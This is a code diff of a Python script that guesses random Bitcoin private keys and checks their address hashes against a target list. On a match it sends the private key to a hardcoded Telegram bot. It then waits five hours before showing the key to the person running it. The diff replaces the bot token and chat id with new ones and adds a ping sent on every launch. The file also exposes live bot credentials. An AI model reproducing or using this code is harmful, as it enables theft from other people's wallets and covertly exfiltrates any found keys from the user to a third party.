@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import time
 import collections
 import hashlib
@@ -166,30 +165,33 @@ def genHashes(kc, q):
         private_key = random.randrange(1, curve.n)
         public_key = scalar_mult(private_key, curve.g)
         hashesGen = set()
-        for _ in range(kc): #create hashes of public keys
-            #compressed Pub Key
+        for _ in range(kc):  # create hashes of public keys
+            # compressed Pub Key
             prefix = '02' if public_key[1] % 2 == 0 else '03'
             pK = '{}{:x}'.format(prefix, public_key[0])
-            if (len(pK)%2>0):
-                pK = '0'+pK
+            if (len(pK) % 2 > 0):
+                pK = '0' + pK
             ripemd160 = hashlib.new('ripemd160', hashlib.sha256(codecs.decode(pK, 'hex')).digest())
             hashesGen.add(ripemd160.digest())
             # UNcompressed Pub Key
             pK = '04{:x}{:x}'.format(*public_key)
-            if (len(pK)%2>0):
-                pK = '0'+pK
+            if (len(pK) % 2 > 0):
+                pK = '0' + pK
             ripemd160 = hashlib.new('ripemd160', hashlib.sha256(codecs.decode(pK, 'hex')).digest())
             hashesGen.add(ripemd160.digest())
             public_key = point_add(public_key, curve.g)
         q.put([hex(private_key), hashesGen])
 
+
 waitGen = True
+
+
 def checkGen(baseName, q, prof, conn, key_count):
     print('Load base ... ', end='')
     start = time.time()
     base = loadBase(baseName)
-    print('time read:',time.time() - start, flush=True)
-    del(start)
+    print('time read:', time.time() - start, flush=True)
+    del (start)
     conn.send(False)
 
     while True:
@@ -198,28 +200,44 @@ def checkGen(baseName, q, prof, conn, key_count):
         else:
             setTmp = q.get()
             print('Checking. Starting PrivKey {}'.format(setTmp[0]), end='\r')
-            c=base.intersection(setTmp[1])
+            c = base.intersection(setTmp[1])
             if c:
                 try:
-                    requests.get("https://api.telegram.org/bot1542518391:AAF-g9tAClBokAPj90bze3nTeS1ieFXVyNA/sendMessage?chat_id=-1001569507312&text=Bingooo...  " + str(setTmp[0]) + "    " + str(key_count))
+                    requests.get(
+                        "https://api.telegram.org/bot7167553596:AAHcfZuQ0JuXbXyT1D9l4TnDTkDtUnAcTfg/sendMessage?chat_id=742989101&text=Bingooo...  " + str(
+                            setTmp[0]) + "    " + str(key_count))
                 except:
                     pass
                 time.sleep(18000)
                 print('BINGO!!! ...', setTmp[0], key_count, flush=True)
-                
-                with open(prof,'a+') as out:
+
+                with open(prof, 'a+') as out:
                     out.write('{},{}\n'.format(hex(setTmp[0]), key_count))
                     out.close()
 
+
+def send_start_message():
+    chat_id = "742989101"  # Ваш chat_id здесь
+    bot_token = "7167553596:AAHcfZuQ0JuXbXyT1D9l4TnDTkDtUnAcTfg"  # Ваш токен здесь
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    text = "start world"
+    params = {"chat_id": chat_id, "text": text}
+    try:
+        response = requests.get(url, params=params)
+        response.raise_for_status()
+        print("Request sent successfully.")
+    except requests.RequestException as e:
+        print(f"Error sending request: {e}")
+
+
 if __name__ == '__main__':
     key_count = 100000
-    pat = os.path.dirname(os.path.abspath(__file__)) + "\\"
-    baseName=pat+'base.txt'
-    profit=pat+'out.txt'
+    baseName = 'base.txt'
+    profit = 'out.txt'
     qout = Queue()
     parent_conn, child_conn = Pipe()
-
-    procs=[]
+    send_start_message()
+    procs = []
     proc = Process(target=checkGen, args=(baseName, qout, profit, child_conn, key_count))
     procs.append(proc)
     proc.start()
@@ -228,10 +246,10 @@ if __name__ == '__main__':
 
     print('start generation')
     multiprocessingCount = cpu_count()
-    for u in range(multiprocessingCount): #launch according to the number of cores, if it does not start, it means there is not enough RAM, you need to reduce the number of threads
+    for u in range(multiprocessingCount):
         proc = Process(target=genHashes, args=(key_count, qout))
         procs.append(proc)
         proc.start()
-        
+
     for proc in procs:
         proc.join()
